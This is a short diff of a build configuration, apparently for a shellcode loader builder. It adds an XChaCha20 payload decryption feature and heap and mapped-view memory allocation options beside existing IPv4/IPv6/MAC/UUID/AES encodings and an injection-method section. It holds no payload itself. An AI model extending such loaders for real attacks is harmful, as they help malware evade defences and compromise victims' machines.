@@ -44,11 +44,14 @@ decrypt_ipv6 = ["base64_decode"]               # 启用IPv6解密
 decrypt_mac = ["base64_decode"]                # 启用MAC解密
 decrypt_uuid = ["base64_decode"]               # 启用UUID解密
 decrypt_aes = ["base64_decode"]                # 启用AES解密
+decrypt_xchacha20 = ["base64_decode"]          # 启用XChaCha20-Poly1305解密
 
 # 内存分配方式
 alloc_mem_va = []
 alloc_mem_global = []
 alloc_mem_local = []
+alloc_mem_heap = []
+alloc_mem_mapview = []
 
 # 注入/执行方式
 pattern1 = []
